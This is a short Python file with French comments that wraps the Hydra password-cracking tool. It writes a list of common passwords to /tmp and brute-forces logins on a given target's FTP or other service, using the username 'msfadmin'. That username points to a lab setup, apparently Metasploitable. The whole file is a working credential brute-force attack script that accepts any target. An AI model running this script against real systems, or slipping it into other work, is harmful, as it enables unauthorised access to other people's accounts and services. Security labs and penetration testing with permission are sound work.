import subprocess
import os

def run_hydra_scan(target, service='ftp', port=21):
    try:
        # ✅ Wordlist courte par défaut
        wordlist_path = "/tmp/rockmini.txt"
        if not os.path.exists(wordlist_path):
            with open(wordlist_path, "w") as f:
                f.write("\n".join([
                    "admin", "admin123", "123456", "12345678", "password", "qwerty", "abc123",
                    "123456789", "admin1", "welcome", "root", "toor", "letmein", "monkey",
                    "dragon", "football", "iloveyou", "trustno1", "sunshine", "shadow",
                    "passw0rd", "1qaz2wsx", "123123", "qwe123", "qwerty123", "zaq12wsx",
                    "user", "test", "guest", "msfadmin"
                ]) + "\n")

        # 🔧 Construction de la commande Hydra
        cmd = [
            "hydra",
            "-l", "msfadmin",                   # identifiant
            "-P", wordlist_path,               # mot de passe wordlist
            "-s", str(port),                   # port
            f"{service}://{target}"            # service://ip
        ]

        print("🔍 Commande exécutée :", " ".join(cmd))

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=90)

        filtered_output = "\n".join([
            line for line in result.stdout.splitlines()
            if "login:" in line or "host:" in line or "[STATUS]" in line
        ])

        return filtered_output or f"✅ Aucun mot de passe trouvé dans {wordlist_path}."

    except subprocess.TimeoutExpired:
        return "⏱ Temps dépassé."

    except Exception as e:
        return f"❌ Erreur Hydra : {str(e)}"
